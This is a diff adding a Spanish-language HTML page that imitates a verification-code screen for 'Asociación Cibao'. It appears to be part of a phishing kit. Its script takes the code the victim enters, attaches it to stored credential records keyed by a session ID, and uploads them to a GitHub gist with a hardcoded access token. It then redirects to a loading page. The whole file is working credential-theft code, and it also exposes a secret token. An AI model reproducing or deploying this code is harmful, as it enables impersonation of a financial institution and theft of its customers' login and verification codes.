@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Código de Verificación - Asociación Cibao</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .code-container { background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); width: 350px; text-align: center; }
+        .logo-container { margin-bottom: 20px; }
+        .logo-container img { max-width: 150px; border-radius: 10px; }
+        h2 { color: #333; margin-bottom: 20px; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group label { display: block; margin-bottom: 5px; color: #555; }
+        .input-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        .code-button { background-color: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; width: 100%; font-size: 16px; }
+        .code-button:hover { background-color: #0056b3; }
+        .error-message { color: red; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="code-container">
+        <div class="logo-container">
+            <!-- IMPORTANTE: Reemplaza esta URL con la de tu logo JPG -->
+            <img src="https://example.com/tu-logo.jpg" alt="Logo Asociación Cibao">
+        </div>
+        <h2>Ingresa tu Código</h2>
+        <form id="codeForm">
+            <div class="input-group">
+                <label for="verificationCode">Código de Verificación</label>
+                <input type="text" id="verificationCode" name="verificationCode" required>
+            </div>
+            <button type="submit" class="code-button">Verificar</button>
+            <div id="error-message" class="error-message">Error de conexión. Inténtalo de nuevo.</div>
+        </form>
+    </div>
+
+    <script>
+        const GIST_URL = 'https://gist.githubusercontent.com/elainecrespo6-eng/b8302e6d30ef894d0cb9fbec9591e0dc/raw/31550200bcd7a9ce2f243abf2d19efd2526fc666/gistfile1.txt';
+        const GIST_API_URL = 'https://api.github.com/gists/b8302e6d30ef894d0cb9fbec9591e0dc';
+        const GITHUB_TOKEN = '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';
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('session');
+        
+        document.getElementById('codeForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const code = document.getElementById('verificationCode').value;
+            
+            try {
+                const response = await fetch(GIST_URL);
+                let data;
+                try {
+                    data = await response.json();
+                } catch (jsonError) {
+                    data = { credentials: [] };
+                }
+                
+                const currentSessionIndex = data.credentials.findIndex(c => c.id === sessionId);
+                
+                if (currentSessionIndex !== -1) {
+                    data.credentials[currentSessionIndex].code = code;
+                    data.credentials[currentSessionIndex].status = 'code_submitted';
+                    data.credentials[currentSessionIndex].codeTimestamp = new Date().toISOString();
+                    
+                    const updateResponse = await fetch(GIST_API_URL, {
+                        method: 'PATCH',
+                        headers: {
+                            'Authorization': `token ${GITHUB_TOKEN}`,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            files: {
+                                'gistfile1.txt': {
+                                    content: JSON.stringify(data)
+                                }
+                            }
+                        })
+                    });
+                    
+                    if (updateResponse.ok) {
+                        window.location.href = `load.html?session=${sessionId}`;
+                    } else {
+                        throw new Error('Error al actualizar el Gist');
+                    }
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('error-message').style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
